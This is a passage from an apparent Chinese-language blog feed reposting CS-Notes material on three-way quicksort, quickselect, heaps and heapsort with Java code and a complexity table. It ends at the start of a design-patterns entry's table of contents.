keyword">void</span> <span class="token function">sort</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> h<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>h <span class="token operator">&lt;=</span> l<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> lt <span class="token operator">=</span> l<span class="token punctuation">,</span> i <span class="token operator">=</span> l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> gt <span class="token operator">=</span> h<span class="token punctuation">;</span>        T v <span class="token operator">=</span> nums<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> gt<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> cmp <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> lt<span class="token operator">++</span><span class="token punctuation">,</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> gt<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                i<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> lt <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> gt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="5-基于切分的快速选择算法"><a href="#5-基于切分的快速选择算法" class="headerlink" title="5. 基于切分的快速选择算法"></a>5. 基于切分的快速选择算法</h3><p>快速排序的 partition() 方法，会返回一个整数 j 使得 a[l..j-1] 小于等于 a[j]，且 a[j+1..h] 大于等于 a[j]，此时 a[j] 就是数组的第 j 大元素。</p><p>可以利用这个特性找出数组的第 k 个元素。</p><p>该算法是线性级别的，假设每次能将数组二分，那么比较的总次数为 (N+N/2+N/4+..)，直到找到第 k 个元素，这个和显然小于 2N。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> T <span class="token function">select</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> h <span class="token operator">=</span> nums<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>h <span class="token operator">></span> l<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token function">partition</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">></span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>            h <span class="token operator">=</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            l <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><h3 id="1-堆"><a href="#1-堆" class="headerlink" title="1. 堆"></a>1. 堆</h3><p>堆的某个节点的值总是大于等于子节点的值，并且堆是一颗完全二叉树。</p><p>堆可以用数组来表示，这是因为堆是完全二叉树，而完全二叉树很容易就存储在数组中。位置 k 的节点的父节点位置为 k/2，而它的两个子节点的位置分别为 2k 和 2k+1。这里不使用数组索引为 0 的位置，是为了更清晰地描述节点的位置关系。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/f3080f83-6239-459b-8e9c-03b6641f7815.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/f3080f83-6239-459b-8e9c-03b6641f7815.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Heap</span><span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>T<span class="token operator">>></span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> T<span class="token punctuation">[</span><span class="token punctuation">]</span> heap<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">Heap</span><span class="token punctuation">(</span><span class="token keyword">int</span> maxN<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>heap <span class="token operator">=</span> <span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">Comparable</span><span class="token punctuation">[</span>maxN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> N <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> N<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">less</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> heap<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>heap<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>        T t <span class="token operator">=</span> heap<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        heap<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> heap<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        heap<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="2-上浮和下沉"><a href="#2-上浮和下沉" class="headerlink" title="2. 上浮和下沉"></a>2. 上浮和下沉</h3><p>在堆中，当一个节点比父节点大，那么需要交换这个两个节点。交换后还可能比它新的父节点大，因此需要不断地进行比较和交换操作，把这种操作称为上浮。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/33ac2b23-cb85-4e99-bc41-b7b7199fad1c.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/33ac2b23-cb85-4e99-bc41-b7b7199fad1c.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">swim</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>k <span class="token operator">></span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token function">less</span><span class="token punctuation">(</span>k <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">swap</span><span class="token punctuation">(</span>k <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>        k <span class="token operator">=</span> k <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>类似地，当一个节点比子节点来得小，也需要不断地向下进行比较和交换操作，把这种操作称为下沉。一个节点如果有两个子节点，应当与两个子节点中最大那个节点进行交换。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/72f0ff69-138d-4e54-b7ac-ebe025d978dc.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/72f0ff69-138d-4e54-b7ac-ebe025d978dc.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">sink</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> k <span class="token operator">&lt;=</span> N<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> k<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;</span> N <span class="token operator">&amp;&amp;</span> <span class="token function">less</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            j<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">less</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token function">swap</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>        k <span class="token operator">=</span> j<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="3-插入元素"><a href="#3-插入元素" class="headerlink" title="3. 插入元素"></a>3. 插入元素</h3><p>将新元素放到数组末尾，然后上浮到合适的位置。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span>Comparable v<span class="token punctuation">)</span> <span class="token punctuation">{</span>    heap<span class="token punctuation">[</span><span class="token operator">++</span>N<span class="token punctuation">]</span> <span class="token operator">=</span> v<span class="token punctuation">;</span>    <span class="token function">swim</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="4-删除最大元素"><a href="#4-删除最大元素" class="headerlink" title="4. 删除最大元素"></a>4. 删除最大元素</h3><p>从数组顶端删除最大的元素，并将数组的最后一个元素放到顶端，并让这个元素下沉到合适的位置。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> T <span class="token function">delMax</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    T max <span class="token operator">=</span> heap<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">swap</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> N<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    heap<span class="token punctuation">[</span>N <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token function">sink</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> max<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="5-堆排序"><a href="#5-堆排序" class="headerlink" title="5. 堆排序"></a>5. 堆排序</h3><p>把最大元素和当前堆中数组的最后一个元素交换位置，并且不删除它，那么就可以得到一个从尾到头的递减序列，从正向来看就是一个递增序列，这就是堆排序。</p><h4 id="5-1-构建堆"><a href="#5-1-构建堆" class="headerlink" title="5.1 构建堆"></a>5.1 构建堆</h4><p>无序数组建立堆最直接的方法是从左到右遍历数组进行上浮操作。一个更高效的方法是从右至左进行下沉操作，如果一个节点的两个节点都已经是堆有序，那么进行下沉操作可以使得这个节点为根节点的堆有序。叶子节点不需要进行下沉操作，可以忽略叶子节点的元素，因此只需要遍历一半的元素即可。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/b84ba6fb-312b-4e69-8c77-fb6eb6fb38d4.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/b84ba6fb-312b-4e69-8c77-fb6eb6fb38d4.png" alt="img"></a></p><h4 id="5-2-交换堆顶元素与最后一个元素"><a href="#5-2-交换堆顶元素与最后一个元素" class="headerlink" title="5.2 交换堆顶元素与最后一个元素"></a>5.2 交换堆顶元素与最后一个元素</h4><p>交换之后需要进行下沉操作维持堆的有序状态。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/51fb761d-8ce0-4472-92ff-2f227ac7888a.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/51fb761d-8ce0-4472-92ff-2f227ac7888a.png" alt="img"></a></p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/b20a3466-44b4-445e-87c7-dd4fb9ef44b2.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/b20a3466-44b4-445e-87c7-dd4fb9ef44b2.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HeapSort</span><span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>T<span class="token operator">>></span> <span class="token keyword">extends</span> <span class="token class-name">Sort</span><span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 数组第 0 个位置不能有元素     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sort</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> N <span class="token operator">=</span> nums<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> N <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> k <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">;</span> k<span class="token operator">--</span><span class="token punctuation">)</span>            <span class="token function">sink</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> k<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>N <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> N<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">sink</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">sink</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> N<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> k <span class="token operator">&lt;=</span> N<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> k<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;</span> N <span class="token operator">&amp;&amp;</span> <span class="token function">less</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> j<span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                j<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">less</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> k<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> k<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>            k <span class="token operator">=</span> j<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">less</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="6-分析"><a href="#6-分析" class="headerlink" title="6. 分析"></a>6. 分析</h3><p>一个堆的高度为 logN，因此在堆中插入元素和删除最大元素的复杂度都为 logN。</p><p>对于堆排序，由于要对 N 个节点进行下沉操作，因此复杂度为 NlogN。</p><p>堆排序是一种原地排序，没有利用额外的空间。</p><p>现代操作系统很少使用堆排序，因为它无法利用局部性原理进行缓存，也就是数组元素很少和相邻的元素进行比较。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><h3 id="1-排序算法的比较"><a href="#1-排序算法的比较" class="headerlink" title="1. 排序算法的比较"></a>1. 排序算法的比较</h3><table><thead><tr><th>算法</th><th>稳定性</th><th>时间复杂度</th><th>空间复杂度</th><th>备注</th></tr></thead><tbody><tr><td>选择排序</td><td>×</td><td>N2</td><td>1</td><td></td></tr><tr><td>冒泡排序</td><td>√</td><td>N2</td><td>1</td><td></td></tr><tr><td>插入排序</td><td>√</td><td>N ~ N2</td><td>1</td><td>时间复杂度和初始顺序有关</td></tr><tr><td>希尔排序</td><td>×</td><td>N 的若干倍乘于递增序列的长度</td><td>1</td><td></td></tr><tr><td>快速排序</td><td>×</td><td>NlogN</td><td>logN</td><td></td></tr><tr><td>三向切分快速排序</td><td>×</td><td>N ~ NlogN</td><td>logN</td><td>适用于有大量重复主键</td></tr><tr><td>归并排序</td><td>√</td><td>NlogN</td><td>N</td><td></td></tr><tr><td>堆排序</td><td>×</td><td>NlogN</td><td>1</td></tr></tbody></table><p>快速排序是最快的通用排序算法，它的内循环的指令很少，而且它还能利用缓存，因为它总是顺序地访问数据。它的运行时间近似为 ~cNlogN，这里的 c 比其它线性对数级别的排序算法都要小。使用三向切分快速排序，实际应用中可能出现的某些分布的输入能够达到线性级别，而其它排序算法仍然需要线性对数时间。</p><h3 id="2-Java-的排序算法实现"><a href="#2-Java-的排序算法实现" class="headerlink" title="2. Java 的排序算法实现"></a>2. Java 的排序算法实现</h3><p>Java 主要排序方法为 java.util.Arrays.sort()，对于原始数据类型使用三向切分的快速排序，对于引用类型使用归并排序。</p><p>本文转载自:<a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%AE%97%E6%B3%95.md#%E4%B8%89%E6%8E%92%E5%BA%8F">https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%AE%97%E6%B3%95.md#%E4%B8%89%E6%8E%92%E5%BA%8F</a></p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式</title>
      <link href="/2018/12/24/mian-xiang-dui-xiang/she-ji-mo-shi/"/>
      <url>/2018/12/24/mian-xiang-dui-xiang/she-ji-mo-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#%E4%B8%80%E6%A6%82%E8%BF%B0">一、概述</a></li><li>二、创建型<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#1-%E5%8D%95%E4%BE%8Bsingleton">1. 单例（Singleton）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#2-%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82simple-factory">2. 简单工厂（Simple Factory）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#3-%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95factory-method">3. 工厂方法（Factory Method）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#4-%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82abstract-factory">4. 抽象工厂（Abstract Factory）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#5-%E7%94%9F%E6%88%90%E5%99%A8builder">5. 生成器（Builder）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#6-%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8Fprototype">6. 原型模式（Prototype）</a></li></ul></li><li>三、行为型<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#1-%E8%B4%A3%E4%BB%BB%E9%93%BEchain-of-responsibility">1. 责任链（Chain Of Responsibility）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#2-%E5%91%BD%E4%BB%A4command">2. 命令（Command）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#3-%E8%A7%A3%E9%87%8A%E5%99%A8interpreter">3. 解释器（Interpreter）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#4-%E8%BF%AD%E4%BB%A3%E5%99%A8iterator">4. 迭代器（Iterator）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#5-%E4%B8%AD%E4%BB%8B%E8%80%85mediator">5. 中介者（Mediator）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#6-%E5%A4%87%E5%BF%98%E5%BD%95memento">6. 备忘录（Memento）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#7-%E8%A7%82%E5%AF%9F%E8%80%85observer">7. 观察者（Observer）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#8-%E7%8A%B6%E6%80%81state">8. 状态（State）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#9-%E7%AD%96%E7%95%A5strategy">9. 策略（Strategy）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#10-%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95template-method">10. 模板方法（Template Method）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#11-%E8%AE%BF%E9%97%AE%E8%80%85visitor">11. 访问者（Visitor）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#12-%E7%A9%BA%E5%AF%B9%E8%B1%A1null">12. 空对象（Null）</a></li></ul></li><li>四、结构型<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#1-%E9%80%82%E9%85%8D%E5%99%A8adapter">1. 适配器（Adapter）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#2-%E6%A1%A5%E6%8E%A5bridge">2. 桥接（Bridge）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#3-%E7%BB%84%E5%90%88composite">3. 组合（Composite）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#4-%E8%A3%85%E9%A5%B0decorator">4. 装饰（Decorator）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#5-%E5%A4%96%E8%A7%82facade">5. 外观（Facade）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#6-%E4%BA%AB%E5%85%83flyweight">6. 享元（Flyweight）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#7-%E4%BB%A3%E7%90%86proxy">7. 代理（Proxy）</a></li></ul></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li></ul><h1 id="一、概述"><a href="#一、概述" class="headerlink" 